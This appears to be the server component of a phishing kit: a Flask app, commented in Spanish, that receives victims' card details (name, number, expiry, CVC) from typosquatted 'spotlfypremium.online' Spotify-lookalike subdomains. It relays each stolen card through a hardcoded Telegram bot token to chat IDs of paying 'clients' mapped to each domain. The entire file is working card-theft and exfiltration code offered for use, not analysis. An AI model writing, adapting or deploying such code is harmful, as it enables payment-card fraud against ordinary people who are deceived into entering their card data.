import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
# Permite que los subdominios le hablen al servidor sin bloqueos
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- EL MAPA DE REPARTO (EL SECRETO) ---
# Clave: El dominio donde entra la VÍCTIMA.
# Valor: Lista de IDs de TELEGRAM de los CLIENTES que reciben la CC.
CLIENTES_MAPA = {
    'spotlfypremium.online': ['6953415010', '7707049896'], 
    'cliente1.spotlfypremium.online': ['7707049896'],
    'free.spotlfypremium.online': ['-1087968824', '1087968824'], 
    'promo.spotlfypremium.online': ['123456789'],
    'juan.spotlfypremium.online': ['987654321'],
}

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    # Detectamos el dominio de la víctima automáticamente
    host_recibido = request.headers.get('Host', '').split(':')[0]
    print(f"🌐 PETICIÓN DE VÍCTIMA DESDE: {host_recibido}")

    # Buscamos a qué cliente le pertenece ese dominio
    lista_destinatarios = CLIENTES_MAPA.get(host_recibido)

    if not lista_destinatarios:
        print(f"🚫 DOMINIO NO AUTORIZADO: {host_recibido}")
        return jsonify({"status": "ignored"}), 200

    # Captura de datos directos
    data = request.json
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # Mensaje limpio y directo
    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🌐 *ORIGEN:* `{host_recibido}`\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    # Enviamos la CC a todos los clientes asignados a ese dominio
    exitos = 0
    for id_receptor in lista_destinatarios:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": id_receptor, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200:
                exitos += 1
        except:
            continue

    print(f"🏁 Finalizado. Enviados a {exitos} personas desde {host_recibido}")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
